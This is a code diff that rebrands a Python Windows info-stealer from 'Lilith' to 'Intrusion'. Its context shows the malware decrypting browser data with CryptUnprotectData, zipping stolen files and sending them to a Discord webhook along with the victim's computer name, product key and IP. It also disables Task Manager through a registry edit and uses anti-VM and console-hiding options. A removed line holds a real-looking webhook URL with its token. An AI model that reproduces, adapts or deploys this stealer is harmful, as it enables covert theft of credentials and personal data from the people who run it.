@@ -1,6 +1,4 @@
 import os,json,shutil,keyboard,base64,sqlite3,zipfile,requests,subprocess,psutil,random,ctypes,sys,re,datetime,time,traceback
-import winreg
-import pyautogui
 import numpy as np
 from time import sleep
 from threading import Thread
@@ -9,15 +7,15 @@ from win32crypt import CryptUnprotectData
 from Crypto.Cipher import AES
 from cryptography.fernet import Fernet
 config = {
-    'webhook': "https://discordapp.com/api/webhooks/1166492498219257926/MglE53sDpx9Mjg_0WlbtVryYaU6-kPwGrn181Eu62sJp0jv9dkKN4FHNQ5mKyIdaA_em",
-    'persist': True,
+    'webhook': "WEBHOOKHERE",
+    'persist': False,
     'keep-alive': False,  
     'hideconsole': True, 
     'antivm': True,  
     'force_admin': False, 
     'black_screen': False, 
     'error': True, 
-    'error_message': 'Failed to Start\nPlease note if this keeps happening you do not have a API key or strg08.DLL\n',
+    'error_message': 'He is Clean No traces Found',
 }
 class functions(object):
     def getHeaders(self, token:str=None, content_type="application/json") -> dict:
@@ -64,7 +62,7 @@ class functions(object):
             indent = "│ "
             ret += f"\n{indent*directory_level}<a:earthpink:996004236531859588> {os.path.basename(dirpath)}/"
             for n, f in enumerate(filenames):
-                if f == f'Lilith-{os.getlogin()}.zip': continue
+                if f == f'Intrusion-{os.getlogin()}.zip': continue
                 indent2 = indent if n != len(filenames) - 1 else "└ "
                 ret += f"\n{indent*(directory_level)}{indent2}{f} ({self.fsize((os.path.basename(dirpath)+os.sep if dirpath.split(os.sep)[-1] != internal.tempfolder.split(os.sep)[-1] else '')+f)})"
                 fcount += 1
@@ -107,7 +105,6 @@ class ticks(functions, internal):
                 self.tempfolder = os.path.join(rootpath,''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890',k=8)))
                 break
         internal.tempfolder = self.tempfolder
-
         self.browserpaths = {
             'Opera': self.roaming + r'\\Opera Software\\Opera Stable',
             'Opera GX': self.roaming + r'\\Opera Software\\Opera GX Stable',
@@ -584,29 +581,29 @@ Antivirus: {avlist}
             region = data['region']
             googlemap = "https://www.google.com/maps/search/google+map++" + data['loc']
         except Exception: self.exceptions.append(traceback.format_exc())
-        _zipfile = os.path.join(self.tempfolder, f'Lilith-{os.getlogin()}.zip')
+        _zipfile = os.path.join(self.tempfolder, f'Intrusion-{os.getlogin()}.zip')
         zipped_file = zipfile.ZipFile(_zipfile, "w", zipfile.ZIP_DEFLATED)
         abs_src = os.path.abspath(self.tempfolder)
         for dirname, _, files in os.walk(self.tempfolder):
             for filename in files:
-                if filename == f'Lilith-{os.getlogin()}.zip': continue
+                if filename == f'Intrusion-{os.getlogin()}.zip': continue
                 absname = os.path.abspath(os.path.join(dirname, filename))
                 arcname = absname[len(abs_src) + 1:]
                 zipped_file.write(absname, arcname)
         zipped_file.close()
         self.files, self.fileCount = self.gen_tree(self.tempfolder)
         embed = {
-                    "username": f"{os.getlogin()} | Lilith Developed By veal#0001",
+                    "username": f"{os.getlogin()} | Intrusion Developed By veal#0001",
                     "content": "@everyone",
-                    "avatar_url": "https://cdn.discordapp.com/attachments/1166460514931585057/1166894920167079966/52d688b2e1a36a92f4d01e42b5d142f0.jpg?ex=654c2694&is=6539b194&hm=36326cf58446de5f8dcfb3ebbbbd48f034f6d260d65f637c330770707103c15c&",
+                    "avatar_url": "https://cdn.discordapp.com/attachments/1167259290608873535/1177459014485954580/pfp.png?ex=65729529&is=65602029&hm=c59ec1d1b1629e34fad50a7339172db2c8275d580df9bebfa0837748232342df&",
                     "embeds": [
                                 {
                                     "author": {
-                                        "name": "Lilith",
+                                        "name": "Intrusion",
                                         "url": "",
-                                        "icon_url": "https://cdn.discordapp.com/attachments/1166460514931585057/1166894920167079966/52d688b2e1a36a92f4d01e42b5d142f0.jpg?ex=654c2694&is=6539b194&hm=36326cf58446de5f8dcfb3ebbbbd48f034f6d260d65f637c330770707103c15c&"
+                                        "icon_url": "https://cdn.discordapp.com/attachments/1167259290608873535/1177459014485954580/pfp.png?ex=65729529&is=65602029&hm=c59ec1d1b1629e34fad50a7339172db2c8275d580df9bebfa0837748232342df&"
                                     },
-                                    "description": f'**{os.getlogin()}** ran Lilith.\n\n'
+                                    "description": f'**{os.getlogin()}** ran Intrusion.\n\n'
                                                    f'<a:2786verifyblack:1162739090534445106>  **Computer Name:** {os.getenv("COMPUTERNAME")}\n'
                                                    f'<a:2786verifyblack:1162739090534445106> **{wname}:** {wkey if wkey else "No Product Key!"}\n'
                                                    f'<a:06x6Luv:1162738908015099987>  **IP:** {ip} (VPN/Proxy: {requests.get("http://ip-api.com/json?fields=proxy").json()["proxy"]})\n'
@@ -626,18 +623,18 @@ Antivirus: {avlist}
                                     "color": 0x00000,
                                     "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime()),
                                     "thumbnail": {
-                                        "url": "https://cdn.discordapp.com/attachments/1166460514931585057/1166894920167079966/52d688b2e1a36a92f4d01e42b5d142f0.jpg?ex=654c2694&is=6539b194&hm=36326cf58446de5f8dcfb3ebbbbd48f034f6d260d65f637c330770707103c15c&"
+                                        "url": "https://cdn.discordapp.com/attachments/1167259290608873535/1177459014485954580/pfp.png?ex=65729529&is=65602029&hm=c59ec1d1b1629e34fad50a7339172db2c8275d580df9bebfa0837748232342df&"
                                     },
                                     "footer": {
-                                        "text": "Lilith",
-                                        "icon_url": "https://cdn.discordapp.com/attachments/1166460514931585057/1166894920167079966/52d688b2e1a36a92f4d01e42b5d142f0.jpg?ex=654c2694&is=6539b194&hm=36326cf58446de5f8dcfb3ebbbbd48f034f6d260d65f637c330770707103c15c&"
+                                        "text": "Intrusion",
+                                        "icon_url": "https://cdn.discordapp.com/attachments/1167259290608873535/1177459014485954580/pfp.png?ex=65729529&is=65602029&hm=c59ec1d1b1629e34fad50a7339172db2c8275d580df9bebfa0837748232342df&"
                                     }
                                 }
                             ]
                         }         
         fileEmbed = {
-            "username": f"{os.getlogin()} | Lilith",
-            "avatar_url":"https://cdn.discordapp.com/attachments/1166460514931585057/1166894920167079966/52d688b2e1a36a92f4d01e42b5d142f0.jpg?ex=654c2694&is=6539b194&hm=36326cf58446de5f8dcfb3ebbbbd48f034f6d260d65f637c330770707103c15c&"
+            "username": f"{os.getlogin()} | Intrusion",
+            "avatar_url":"https://cdn.discordapp.com/attachments/1167259290608873535/1177459014485954580/pfp.png?ex=65729529&is=65602029&hm=c59ec1d1b1629e34fad50a7339172db2c8275d580df9bebfa0837748232342df&"
         }
         
         with open(_zipfile,'rb') as infozip:
@@ -704,7 +701,6 @@ def handler():
             time.sleep(random.randrange(3400,3800))
             try: ticks(0x0000000000F)
             except Exception: pass
-
 def distskmngr(self):
     try: self.system('powershell New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Value "1" -Force')
     except:
